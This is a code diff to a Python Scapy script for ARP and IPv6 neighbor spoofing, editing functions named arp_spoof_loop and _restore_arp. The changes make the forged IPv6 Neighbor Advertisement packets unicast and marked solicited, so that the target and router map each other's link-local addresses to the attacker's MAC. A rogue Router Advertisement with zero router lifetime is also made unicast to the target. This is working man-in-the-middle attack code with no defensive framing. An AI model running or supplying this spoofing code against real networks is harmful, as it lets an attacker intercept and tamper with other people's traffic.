@@ -55,25 +55,25 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
         )
 
         # ── 2. IPv6 NDP Neighbor Advertisement (NA) Poisoning Packets ──────────────
-        # Tell Target: router's link-local IPv6 is at my_mac (R=1 Router, O=1 Override)
+        # Tell Target: router's link-local IPv6 is at my_mac (R=1 Router, S=1 Solicited, O=1 Override)
         pkt_na_to_target = (
             Ether(dst=target_mac, src=my_mac) /
-            IPv6(src=router_ipv6_ll, dst="ff02::1") /
-            ICMPv6ND_NA(R=1, S=0, O=1, tgt=router_ipv6_ll) /
+            IPv6(src=router_ipv6_ll, dst=target_ipv6_ll) /
+            ICMPv6ND_NA(R=1, S=1, O=1, tgt=router_ipv6_ll) /
             ICMPv6NDOptDstLLAddr(lladdr=my_mac)
         )
-        # Tell Router: target's link-local IPv6 is at my_mac (R=0 Host, O=1 Override)
+        # Tell Router: target's link-local IPv6 is at my_mac (R=0 Host, S=1 Solicited, O=1 Override)
         pkt_na_to_router = (
             Ether(dst=router_mac, src=my_mac) /
-            IPv6(src=target_ipv6_ll, dst="ff02::1") /
-            ICMPv6ND_NA(R=0, S=0, O=1, tgt=target_ipv6_ll) /
+            IPv6(src=target_ipv6_ll, dst=router_ipv6_ll) /
+            ICMPv6ND_NA(R=0, S=1, O=1, tgt=target_ipv6_ll) /
             ICMPv6NDOptDstLLAddr(lladdr=my_mac)
         )
 
         # ── 3. IPv6 Rogue RA Deprecation Packets (Strictly Unicast to Target) ──────
         # Sourced from the router's real link-local address with routerlifetime=0
         ra_base = (
-            IPv6(src=router_ipv6_ll, dst="ff02::1") /
+            IPv6(src=router_ipv6_ll, dst=target_ipv6_ll) /
             ICMPv6ND_RA(routerlifetime=0, chlim=64, prf=3) /
             ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
         )
@@ -142,15 +142,15 @@ def _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac
         # Tell target: router's real MAC (IPv6)
         restore_na_target = (
             Ether(dst=target_mac, src=router_mac) /
-            IPv6(src=router_ipv6_ll, dst="ff02::1") /
-            ICMPv6ND_NA(R=1, S=0, O=1, tgt=router_ipv6_ll) /
+            IPv6(src=router_ipv6_ll, dst=target_ipv6_ll) /
+            ICMPv6ND_NA(R=1, S=1, O=1, tgt=router_ipv6_ll) /
             ICMPv6NDOptDstLLAddr(lladdr=router_mac)
         )
         # Tell router: target's real MAC (IPv6)
         restore_na_router = (
             Ether(dst=router_mac, src=target_mac) /
-            IPv6(src=target_ipv6_ll, dst="ff02::1") /
-            ICMPv6ND_NA(R=0, S=0, O=1, tgt=target_ipv6_ll) /
+            IPv6(src=target_ipv6_ll, dst=router_ipv6_ll) /
+            ICMPv6ND_NA(R=0, S=1, O=1, tgt=target_ipv6_ll) /
             ICMPv6NDOptDstLLAddr(lladdr=target_mac)
         )
 
